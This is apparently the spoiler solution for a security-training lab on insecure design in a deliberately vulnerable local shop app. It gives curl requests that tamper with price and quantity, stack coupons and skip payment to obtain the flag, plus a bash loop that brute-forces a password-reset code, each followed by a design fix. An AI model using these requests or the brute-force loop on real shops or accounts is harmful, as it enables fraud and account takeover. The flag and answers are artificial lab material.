🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A06 — Solution walkthrough (spoilers)

All examples use `curl`. Replace `COOKIE` with the session cookie obtained
after `/login` (`curl -c cookies.txt ...` / `-b cookies.txt`).

## 0. Login

```bash
curl -s -c cookies.txt -X POST http://127.0.0.1:8051/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}'
```

## Defect 1 — the price comes from the client

`create_order()` takes the price like this:
```python
price = it.get("price", product["price"])
```
The server trusts the price that was sent, if it is in the request.

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":3,"quantity":1,"price":1}]}'
# total: 1 instead of 500000
```

**Design rule:** the price is a business fact that only the server knows.
The client may send `product_id` and `quantity`, but never a value that
directly affects money.

**Fix:** `price = product["price"]` — the `price` field from the request is
simply ignored (`fixed/app.py`, `# FIX 1`).

## Defect 2 — unlimited/negative quantity

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":2,"quantity":-10}]}'
# total: -1500000 → on payment alice's balance does not go down, it goes up
```

**Rule:** any numeric field from the client that takes part in money
calculations must be limited to a valid range (here 1–10), not just checked
for "exists".

**Fix:** `1 <= qty <= MAX_QTY`, otherwise 400 (`# FIX 2`).

## Defect 3 — a coupon without limits

```bash
curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":2,"quantity":1}],"coupons":["WELCOME50","WELCOME50","WELCOME50"]}'
# the discount is added up three times
```

**Rule:** the business rule "one coupon = one discount, once per user" must
be coded explicitly, not follow "by itself" from the way the sum is computed.

**Fix:** at most one coupon per order, and the coupon must be unused by the
user; the fact of use is recorded at the moment of payment, not when the
order is created (`# FIX 3`, and a second check inside `/pay`).

## Defect 4/5 — bypassing the order of steps (create → pay → ship)

```bash
OID=$(curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders \
  -H 'Content-Type: application/json' \
  -d '{"items":[{"product_id":3,"quantity":1}]}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')

curl -s -b cookies.txt -X POST http://127.0.0.1:8051/orders/$OID/ship
# {"flag": "FLAG{A06_gift_delivered_without_paying_properly}", "status": "shipped"} — without paying!
```

An order can also be paid again (`/pay` does not check `status`), and
combined with defect 2 (a negative total) this also raises the attacker's
balance on every repeated call.

**Rule:** a multi-step process (created → paid → shipped) is a state
machine. Every transition must check the **current state**, not rely on the
client calling the endpoints "in the right order". The order of calls is set
by the client — it cannot be trusted.

**Fix:** `/pay` requires `status == "created"`, `/ship` requires
`status == "paid"` (`# FIX 4`, `# FIX 5`).

## Defect 6/7 — brute-forcing the password recovery code

In the `docker compose logs vulnerable` logs you can see a 4-digit code
(`random.randint(0, 9999)`) with no limit on attempts:

```bash
for i in $(seq -w 0 9999); do
  r=$(curl -s -X POST http://127.0.0.1:8051/password-reset/confirm \
    -H 'Content-Type: application/json' \
    -d "{\"username\":\"bob\",\"otp\":\"$i\",\"new_password\":\"hacked123\"}")
  echo "$r" | grep -q '"ok": true' && echo "FOUND: $i" && break
done
```
10,000 options are tried in seconds — the server does not limit the number
of attempts and does not use a cryptographically strong generator.

**Rule:** a one-time code is a secret with a short lifetime and a limited
number of guesses. Length and source of randomness (`random`, which is not
cryptographically strong) are not enough on their own — you need protection
against brute force at the process level, not just "a longer number".

**Fix** (`fixed/app.py`):
- `secrets.randbelow()` instead of `random.randint()`, a 6-digit code;
- `OTP_MAX_ATTEMPTS = 5` — after 5 wrong attempts the code is destroyed;
- `OTP_TTL = 300` seconds — the code expires with time;
- `OTP_COOLDOWN = 60` seconds — a code cannot be reissued instantly to reset
  the attempt counter;
- the code is compared with `hmac.compare_digest` (resistant to timing
  attacks);
- `/password-reset/request` answers the same whether or not the user exists
  (it does not allow enumerating accounts).

## Summary: what in this lab is specifically Insecure Design

Not one of the seven defects is fixed by adding escaping, a filter or a
single permission check — in every case a decision had to be made **at the
design stage**: who is the source of truth for the price; which ranges are
valid; how many times a discount may be applied; which state transitions are
allowed; how to protect a one-time secret from brute force. That is the
essence of A06 — the vulnerability lives not in a line of code but in a
missing rule.
